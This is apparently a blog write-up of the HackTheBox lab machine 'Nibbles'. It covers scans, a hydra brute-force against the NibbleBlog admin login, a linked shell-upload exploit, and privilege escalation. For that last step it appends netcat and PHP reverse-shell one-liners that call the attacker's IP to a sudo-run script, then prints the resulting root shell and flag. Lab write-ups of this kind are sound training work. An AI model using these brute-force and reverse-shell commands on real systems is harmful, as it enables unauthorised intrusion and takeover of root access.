---
layout: post
title: "Nibbles Writeup - HackTheBox"
category: HackTheBox
---
# HTB lab Machine - Nibbles

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.143.50 folder that I have attached to this post.

## Enumeration summary

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![image-20210508114249775](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508114249775.png)

![image-20210508114418204](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508114418204.png)

![image-20210508115151029](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508115151029.png)

```
kali@kali:~/Desktop/DownloadedScripts$ nikto -host http://10.129.143.50/nibbleblog/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.143.50
+ Target Hostname:    10.129.143.50
+ Target Port:        80
+ Start Time:         2021-05-08 11:59:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-29786: /nibbleblog/admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /nibbleblog/admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
```

```
PORT      STATE         SERVICE      REASON              VERSION
53/udp    open|filtered domain       no-response
67/udp    open|filtered dhcps        no-response
68/udp    open|filtered dhcpc        no-response
69/udp    open|filtered tftp         no-response
123/udp   open|filtered ntp          no-response
135/udp   open|filtered msrpc        no-response
137/udp   open|filtered netbios-ns   no-response
138/udp   open|filtered netbios-dgm  no-response
139/udp   open|filtered netbios-ssn  no-response
161/udp   open|filtered snmp         no-response
162/udp   open|filtered snmptrap     no-response
445/udp   open|filtered microsoft-ds no-response
500/udp   open|filtered isakmp       no-response
514/udp   open|filtered syslog       no-response
520/udp   open|filtered route        no-response
631/udp   open|filtered ipp          no-response
1434/udp  open|filtered ms-sql-m     no-response
1900/udp  open|filtered upnp         no-response
4500/udp  closed        nat-t-ike    port-unreach ttl 63
49152/udp open|filtered unknown      no-response

```

![image-20210509080118367](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210509080118367.png)

## Exploitation

Found this exploit, but it requires admin login: https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html

I tried hydra:

```
kali@kali:~/Desktop$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV -f -t 2 10.129.143.50 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:login_error"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-09 08:04:28
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 2 tasks per 1 server, overall 2 tasks, 14344399 login tries (l:1/p:14344399), ~7172200 tries per task
[DATA] attacking http-post-form://10.129.143.50:80/nibbleblog/admin.php:username=^USER^&password=^PASS^:login_error
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.129.143.50 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.129.143.50 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[80][http-post-form] host: 10.129.143.50   login: admin   password: 123456
[STATUS] attack finished for 10.129.143.50 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-09 08:04:40
```

Eventhough hydra says the creds are admin:123456 thats not working. So after some trial and error I came up with the password "nibbles" for the admin. And we are set to exploit the system. Just follow the steps in the exploit.

- The php reverse shell I used: https://github.com/pentestmonkey/php-reverse-shell
- Added reverse shell here: http://10.129.143.50/nibbleblog/admin.php?controller=plugins&action=config&plugin=about
- Initiated reverse shell here: http://10.129.143.50/nibbleblog/content/private/plugins/about/

And we have foothold:

![image-20210509083755896](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210509083755896.png)

Privesc seems like an easy win:

```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

```
$ mkdir personal
$ mkdir personal/stuff
$ cd personal/stuff
$ dir
$ pwd             
/home/nibbler/personal/stuff
```

```
$ unzip personal.zip
Archive:  personal.zip
replace personal/stuff/monitor.sh? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: personal/stuff/monitor.sh  
$ dir
personal  personal.zip	user.txt
$ cd personal
$ dir
stuff
$ cd stuff
$ dir
monitor.sh
$ ls -al
total 12
drwxrwxrwx 2 nibbler nibbler 4096 May  9 09:01 .
drwxrwxrwx 3 nibbler nibbler 4096 May  9 08:43 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
$ cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
$ whereis nc    
nc: /bin/nc /bin/nc.openbsd /usr/share/man/man1/nc.1.gz
$ echo nc -e /bin/bash 10.10.14.45 4242 >> monitor.sh
$ cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
nc -e /bin/bash 10.10.14.45 4242
$ 

```

But that did not work. so we echo'd this into monitor.sh:

```
echo php -r "'\$sock=fsockopen(\"10.10.14.45\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" >> monitor.sh
```

Start a listener and run that bitch with sudo:

```
listening on [any] 4242 ...
10.129.143.50: inverse host lookup failed: Unknown host
connect to [10.10.14.45] from (UNKNOWN) [10.129.143.50] 35844
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# pwd
/home/nibbler/personal/stuff
# cd /root
# dir
root.txt
# id
uid=0(root) gid=0(root) groups=0(root)
# cat root.txt
fc705b2fc56f25eb2791a9d0dad7ab2c
# 

```

## Final thoughts

Funky lil 20 pointer.
